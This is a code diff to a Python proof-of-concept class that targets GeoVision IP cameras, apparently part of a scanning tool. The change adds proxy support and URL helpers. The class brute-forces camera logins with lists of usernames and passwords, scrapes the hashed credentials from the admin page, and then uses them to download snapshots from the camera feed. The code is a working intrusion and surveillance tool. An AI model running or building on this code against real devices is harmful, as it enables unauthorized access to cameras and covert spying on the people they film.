@@ -17,18 +17,17 @@ class GeovisionWeakPassword(POCTemplate):
         self.ref = ''
         self.level = POCTemplate.level.low
         self.desc = ''
-        self.headers = {
-            'User-Agent': self.config.user_agent,
-        }
 
     def verify(self, ip, port=80):
+        headers = self._get_headers()
+        proxies = self._get_proxies()
         session = requests.session()
 
         # 先获取构造登录信息需要的变量
-        info_url = f"http://{ip}:{port}/ssi.cgi/Login.htm"
+        info_url = self._get_url(ip, port, '/ssi.cgi/Login.htm')
         cc1, cc2, token = '', '', ''
         try:
-            info_req = session.get(info_url, timeout=self.config.timeout, headers=self.headers, verify=False)
+            info_req = session.get(info_url, timeout=self.config.timeout, headers=headers, verify=False, proxies=proxies)
             if info_req.status_code == 200:
                 if res := re.findall(r'var cc1="(.*)"; var cc2="(.*)"', info_req.text):
                     cc1, cc2 = res[0]
@@ -39,7 +38,7 @@ class GeovisionWeakPassword(POCTemplate):
             return None
 
         # 弱口令尝试
-        login_url = f"http://{ip}:{port}/LoginPC.cgi"
+        login_url = self._get_url(ip, port, '/LoginPC.cgi')
         for user in self.config.users:
             for password in self.config.passwords:
                 try:
@@ -55,7 +54,7 @@ class GeovisionWeakPassword(POCTemplate):
                     if token:
                         data['web_login_token'] = int(token)
                         data['browser'] = ''
-                    req = session.post(login_url, data=data, timeout=self.config.timeout, headers=self.headers, verify=False)
+                    req = session.post(login_url, data=data, timeout=self.config.timeout, headers=headers, verify=False, proxies=proxies)
                     if req.status_code == 200 and 'Web-Manager' in req.text:
                         hashed_user = re.findall(f'gUserName = "(.*)"', req.text)[0]
                         hashed_password = re.findall(f'gPassword = "(.*)"', req.text)[0]
@@ -68,7 +67,7 @@ class GeovisionWeakPassword(POCTemplate):
     def exploit(self, results):
         ip, port, product, user, password, vul, hashed_user, hashed_password, desc = results
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
-        url = f"http://{ip}:{port}/PictureCatch.cgi?username={hashed_user}&password={hashed_password}&data_type=0&attachment=1&channel=1&secret=1&key={desc}"
+        url = self._get_url(ip, port, f'/PictureCatch.cgi?username={hashed_user}&password={hashed_password}&data_type=0&attachment=1&channel=1&secret=1&key={desc}')
         return self._snapshot(url, img_file_name)
 
 
